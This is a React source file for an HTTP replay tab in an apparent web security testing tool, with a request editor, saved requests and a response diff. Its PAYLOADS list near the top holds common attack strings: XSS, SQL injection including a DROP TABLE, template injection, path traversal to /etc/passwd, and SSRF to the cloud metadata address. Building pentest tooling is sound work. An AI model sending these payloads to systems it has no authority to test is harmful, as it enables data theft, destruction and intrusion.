// src/components/tabs/TabReplay.tsx
import React, { useState, useEffect } from "react";
import { invoke } from "@tauri-apps/api/core";
import { Card, SectionHdr, Btn } from "../ui";
import type { SavedRequest, HttpResponse } from "../../types";

const PAYLOADS: Record<string, string[]> = {
  XSS:  ["<script>alert(1)</script>", "'\"><img src=x onerror=alert(1)>", "javascript:alert(1)", "<svg onload=alert(1)>"],
  SQLi: ["' OR '1'='1", "' UNION SELECT NULL--", "'; DROP TABLE users--", "1' AND SLEEP(5)--"],
  SSTI: ["{{7*7}}", "${7*7}", "<%= 7*7 %>", "#{7*7}"],
  Path: ["../../../etc/passwd", "..\\..\\..\\windows\\win.ini", "%2e%2e%2f%2e%2e%2f", "....//....//etc/passwd"],
  SSRF: ["http://169.254.169.254/latest/meta-data/", "http://127.0.0.1:22", "file:///etc/passwd", "http://[::]:80/"],
};

const EMPTY_REQ: SavedRequest = { id: "", name: "", method: "GET", url: "", headers: [["User-Agent", "ProbeScan/1.0"]], body: undefined, created_at: "" };

export default function TabReplay() {
  const [saved, setSaved] = useState<SavedRequest[]>([]);
  const [req, setReq] = useState<SavedRequest>({ ...EMPTY_REQ });
  const [res, setRes] = useState<HttpResponse | null>(null);
  const [resB, setResB] = useState<HttpResponse | null>(null);
  const [loading, setLoading] = useState(false);
  const [loadingB, setLoadingB] = useState(false);
  const [showPayloads, setShowPayloads] = useState(false);
  const [diffMode, setDiffMode] = useState(false);
  const [saveName, setSaveName] = useState("");

  useEffect(() => { invoke<SavedRequest[]>("list_saved_requests").then(setSaved).catch(() => {}); }, []);

  const send = async (setR: (r: HttpResponse) => void, setL: (b: boolean) => void) => {
    setL(true);
    try {
      const r = await invoke<HttpResponse>("send_http_request", {
        method: req.method, url: req.url, headers: req.headers,
        body: req.body ?? null, followRedirects: true, timeoutSecs: 30,
      });
      setR(r);
    } catch (e) { alert(`Error: ${e}`); }
    finally { setL(false); }
  };

  const saveReq = async () => {
    if (!saveName) return;
    const saved_r = await invoke<SavedRequest>("save_request", { request: { ...req, name: saveName } });
    setSaved(s => [...s.filter(x => x.id !== saved_r.id), saved_r]);
    setSaveName("");
  };

  const addHeader = () => setReq(r => ({ ...r, headers: [...r.headers, ["", ""]] }));
  const setHeader = (i: number, k: string, v: string) =>
    setReq(r => { const h = [...r.headers]; h[i] = [k, v]; return { ...r, headers: h }; });

  const statusColor = (s: number) => s >= 200 && s < 300 ? "var(--green)" : s >= 300 && s < 400 ? "var(--yellow)" : "var(--red)";

  const inp = (style?: React.CSSProperties) => ({
    style: { background: "var(--bg2)", border: "1px solid var(--border)", color: "var(--text)", fontFamily: "var(--font-mono)", fontSize: 12, borderRadius: "var(--r)", padding: "7px 10px", outline: "none", ...style }
  });

  return (
    <div style={{ padding: 20, height: "100%", display: "flex", flexDirection: "column", gap: 12, overflow: "hidden" }}>
      <div style={{ display: "flex", gap: 16, flex: 1, overflow: "hidden" }}>

        {/* Left: Request editor */}
        <div style={{ flex: 1, display: "flex", flexDirection: "column", gap: 10, overflow: "hidden" }}>
          <SectionHdr title="Request Editor" right={
            <div style={{ display: "flex", gap: 6 }}>
              <button onClick={() => setShowPayloads(!showPayloads)} style={{ ...inp().style, cursor: "pointer", padding: "4px 8px", fontSize: 11 }}>
                Payloads {showPayloads ? "▲" : "▼"}
              </button>
              <Btn size="sm" variant="primary" onClick={() => send(setRes, setLoading)} disabled={!req.url || loading}>
                {loading ? "Sending…" : "▶ Send"}
              </Btn>
              {diffMode && <Btn size="sm" onClick={() => send(setResB, setLoadingB)} disabled={!req.url || loadingB}>Send B</Btn>}
              <Btn size="sm" variant={diffMode ? "primary" : "ghost"} onClick={() => setDiffMode(!diffMode)}>Diff</Btn>
            </div>
          } />

          {showPayloads && (
            <Card style={{ padding: "8px 10px" }}>
              <div style={{ display: "flex", gap: 6, flexWrap: "wrap" }}>
                {Object.entries(PAYLOADS).map(([cat, payloads]) => (
                  <div key={cat}>
                    <div style={{ fontSize: 10, color: "var(--text-dim)", textTransform: "uppercase", marginBottom: 4 }}>{cat}</div>
                    {payloads.map(p => (
                      <button key={p} onClick={() => setReq(r => ({ ...r, body: (r.body ?? "") + p }))}
                        style={{ ...inp({ cursor: "pointer", display: "block", width: "100%", textAlign: "left", marginBottom: 2, padding: "3px 8px", fontSize: 10 }).style }}>
                        {p.slice(0, 30)}
                      </button>
                    ))}
                  </div>
                ))}
              </div>
            </Card>
          )}

          <div style={{ display: "flex", gap: 8 }}>
            <select {...inp({ width: 90, flexShrink: 0 })} value={req.method} onChange={e => setReq(r => ({ ...r, method: e.target.value }))}>
              {["GET","POST","PUT","PATCH","DELETE","HEAD","OPTIONS"].map(m => <option key={m}>{m}</option>)}
            </select>
            <input {...inp({ flex: 1 })} value={req.url} onChange={e => setReq(r => ({ ...r, url: e.target.value }))} placeholder="https://target.com/api/endpoint" />
          </div>

          <div style={{ fontSize: 10, color: "var(--text-dim)", textTransform: "uppercase", letterSpacing: 1, marginBottom: 4 }}>Headers</div>
          {req.headers.map(([k, v], i) => (
            <div key={i} style={{ display: "flex", gap: 6, marginBottom: 4 }}>
              <input {...inp({ flex: 1 })} value={k} onChange={e => setHeader(i, e.target.value, v)} placeholder="Header-Name" />
              <input {...inp({ flex: 2 })} value={v} onChange={e => setHeader(i, k, e.target.value)} placeholder="Value" />
              <button onClick={() => setReq(r => ({ ...r, headers: r.headers.filter((_, j) => j !== i) }))}
                style={{ ...inp({ padding: "7px 8px", cursor: "pointer" }).style }}>✕</button>
            </div>
          ))}
          <Btn size="sm" onClick={addHeader}>+ Header</Btn>

          {req.method !== "GET" && req.method !== "HEAD" && (
            <>
              <div style={{ fontSize: 10, color: "var(--text-dim)", textTransform: "uppercase", letterSpacing: 1, marginTop: 6 }}>Body</div>
              <textarea {...inp({ resize: "vertical", height: 100, fontFamily: "var(--font-mono)" })}
                value={req.body ?? ""} onChange={e => setReq(r => ({ ...r, body: e.target.value || undefined }))} placeholder="Request body…" />
            </>
          )}

          <div style={{ display: "flex", gap: 8, marginTop: "auto" }}>
            <input {...inp({ flex: 1 })} value={saveName} onChange={e => setSaveName(e.target.value)} placeholder="Save as…" />
            <Btn size="sm" onClick={saveReq} disabled={!saveName}>Save</Btn>
          </div>

          {saved.length > 0 && (
            <div style={{ overflowY: "auto", maxHeight: 120 }}>
              {saved.map(s => (
                <div key={s.id} style={{ display: "flex", alignItems: "center", gap: 8, padding: "4px 0", borderBottom: "1px solid var(--border)" }}>
                  <span style={{ fontSize: 10, color: "var(--accent)", flex: 0, flexShrink: 0 }}>{s.method}</span>
                  <span style={{ fontSize: 11, color: "var(--text)", flex: 1, overflow: "hidden", textOverflow: "ellipsis", whiteSpace: "nowrap", cursor: "pointer" }}
                    onClick={() => setReq(s)}>{s.name || s.url}</span>
                  <button onClick={() => invoke("delete_saved_request", { id: s.id }).then(() => setSaved(x => x.filter(r => r.id !== s.id)))}
                    style={{ ...inp({ padding: "2px 6px", cursor: "pointer", fontSize: 10 }).style }}>✕</button>
                </div>
              ))}
            </div>
          )}
        </div>

        {/* Right: Response */}
        <div style={{ flex: 1, display: "flex", flexDirection: "column", gap: 10, overflow: "hidden" }}>
          <SectionHdr title={diffMode ? "Response A" : "Response"} />
          {res ? (
            <div style={{ flex: 1, display: "flex", flexDirection: "column", overflow: "hidden" }}>
              <div style={{ display: "flex", gap: 12, marginBottom: 8 }}>
                <span style={{ fontSize: 20, fontFamily: "var(--font-ui)", fontWeight: 800, color: statusColor(res.status) }}>{res.status}</span>
                <span style={{ fontSize: 12, color: "var(--text-dim)", alignSelf: "center" }}>{res.status_text}</span>
                <span style={{ fontSize: 11, color: "var(--text-dim)", alignSelf: "center", marginLeft: "auto" }}>{res.duration_ms}ms</span>
              </div>
              <div style={{ fontSize: 10, color: "var(--text-dim)", marginBottom: 4 }}>HEADERS</div>
              <div style={{ background: "var(--bg0)", border: "1px solid var(--border)", borderRadius: "var(--r)", padding: 8, fontSize: 10, maxHeight: 100, overflowY: "auto", marginBottom: 8 }}>
                {res.headers.map(([k, v], i) => <div key={i}><span style={{ color: "var(--accent)" }}>{k}</span>: {v}</div>)}
              </div>
              <div style={{ fontSize: 10, color: "var(--text-dim)", marginBottom: 4 }}>BODY</div>
              <pre style={{ flex: 1, background: "var(--bg0)", border: "1px solid var(--border)", borderRadius: "var(--r)", padding: 10, fontSize: 11, overflowY: "auto", whiteSpace: "pre-wrap", wordBreak: "break-all", color: "var(--text)" }}>
                {res.body || "(empty)"}
              </pre>
            </div>
          ) : <div style={{ flex: 1, display: "flex", alignItems: "center", justifyContent: "center", color: "var(--text-dim)", fontSize: 12 }}>Send a request to see the response.</div>}

          {diffMode && resB && (
            <>
              <SectionHdr title="Response B" />
              <div style={{ display: "flex", gap: 12, marginBottom: 8 }}>
                <span style={{ fontSize: 20, fontFamily: "var(--font-ui)", fontWeight: 800, color: statusColor(resB.status) }}>{resB.status}</span>
                <span style={{ fontSize: 11, color: "var(--text-dim)", alignSelf: "center", marginLeft: "auto" }}>{resB.duration_ms}ms</span>
              </div>
              <pre style={{ flex: 1, background: "var(--bg0)", border: "1px solid var(--border)", borderRadius: "var(--r)", padding: 10, fontSize: 11, overflowY: "auto", whiteSpace: "pre-wrap", wordBreak: "break-all", color: "var(--text)" }}>
                {resB.body}
              </pre>
            </>
          )}
        </div>
      </div>
      <div style={{ textAlign: "center", fontSize: 11, color: "var(--text-dim)", opacity: .5 }}>
        Build with ❤️ by Perchant
      </div>
    </div>
  );
}
